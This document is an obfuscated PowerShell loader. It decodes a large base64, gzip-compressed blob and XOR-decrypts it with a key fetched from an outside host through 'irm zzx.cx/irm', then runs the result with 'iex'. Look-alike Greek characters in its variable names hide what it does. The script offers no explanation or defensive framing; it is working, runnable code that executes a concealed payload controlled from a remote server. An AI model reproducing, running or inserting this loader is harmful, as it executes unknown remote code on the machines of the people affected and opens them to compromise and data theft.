$Basedata=[Convert]::FromBase64String("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");$BαseDαta = (i"r"m zzx"."cx/i"r"m);$BaseDatα=New-Object System.IO.MemoryStream;$BaseDatα.Write($Basedata,0,$Basedata.Length);$BaseDatα.Seek(0,0);$BαseData=New-Object System.IO.Compression.GZipStream($BaseDatα,[System.IO.Compression.CompressionMode]::Decompress);$BaseDαta=New-Object System.IO.StreamReader($BαseData);$BαseDαtα=$BaseDαta.ReadToEnd();$BaseDαta.Close();$BαseData.Close();$BaseDαtα=[Convert]::FromBase64String($BαseDαtα);$BαseDatα=[System.Text.Encoding]::UTF8.GetString((0..($BaseDαtα.Length-1)|%{$BaseDαtα[$_] -bxor [byte]$BαseDαta[$_%$BαseDαta.Length]}));iex $BαseDatα;
